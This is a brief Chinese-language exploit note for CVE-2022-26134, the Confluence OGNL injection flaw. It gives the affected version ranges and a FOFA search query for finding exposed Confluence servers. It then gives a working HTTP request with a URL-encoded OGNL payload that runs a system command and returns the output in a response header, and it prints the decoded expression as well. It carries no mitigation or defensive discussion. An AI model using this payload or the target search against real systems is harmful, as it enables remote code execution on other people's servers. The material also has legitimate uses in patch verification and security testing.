# Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）

## 利用条件：
- Confluence Server and Data Center >= 1.3.0、< 7.4.17、 < 7.13.7、 < 7.14.3、< 7.15.2、< 7.16.4、< 7.17.4、< 7.18.1

## 资产收集：
  fofa:`app="ATLASSIAN-Confluence"`

#### POC
```shell
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
```
![](img/poc.png)
OGNL表达式为：
`${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}`